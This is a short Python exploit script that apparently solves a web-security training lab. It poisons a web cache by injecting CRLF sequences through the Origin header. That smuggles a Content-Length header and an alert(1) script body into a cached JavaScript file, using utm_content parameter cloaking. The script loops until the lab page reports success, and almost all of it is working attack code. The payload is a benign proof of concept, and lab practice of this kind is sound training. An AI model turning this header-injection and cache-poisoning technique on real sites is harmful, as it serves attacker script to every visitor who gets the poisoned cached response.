import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def goto(s, url, path, data={}, headers={}, cookies={}):
    target_url = url + path
    r = s.get(target_url, data=data, headers=headers, cookies=cookies, allow_redirects=True)
    return r.text

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.proxies = proxies
    # s.verify = False
    url = sys.argv[1].rstrip('/')

    file_path = '/js/localize.js?lang=en?utm_content=z&cors=1&x=1'
    headers1 = {
        'Origin': 'x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$',
        'Pragma': 'x-get-cache-key'
    }
    path = '/login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23'
    headers2 = {
        'Pragma': 'x-get-cache-key'
    }

    while True:
        goto(s, url, file_path, headers=headers1)
        goto(s, url, path, headers=headers2)
        check_solved_lab(s, url)
        time.sleep(5)

if __name__ == '__main__':
    main()